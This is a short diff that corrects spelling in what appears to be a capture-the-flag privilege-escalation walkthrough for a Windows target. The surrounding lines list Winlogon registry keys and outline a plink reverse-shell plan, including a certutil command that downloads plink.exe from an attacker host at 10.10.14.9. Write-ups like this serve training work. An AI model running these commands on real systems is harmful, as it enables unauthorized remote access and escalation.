@@ -416,10 +416,10 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
 ```
-The plan is to create a reverse shell using plink and then run winexe to esclate priviliges:
+The plan is to create a reverse shell using plink and then run winexe to escalate priviliges:
 1. Download the latest plink  32-bit exe (https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
 2. Create a local ftp server on the attacker system (sudo python -m SimpleHTTPServer 80)
-3. Upload the plink exuctable on the target system (certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe )
+3. Upload the plink executable on the target system (certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe )
 
 ```
 C:\Users\Alfred\Documents>certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe        
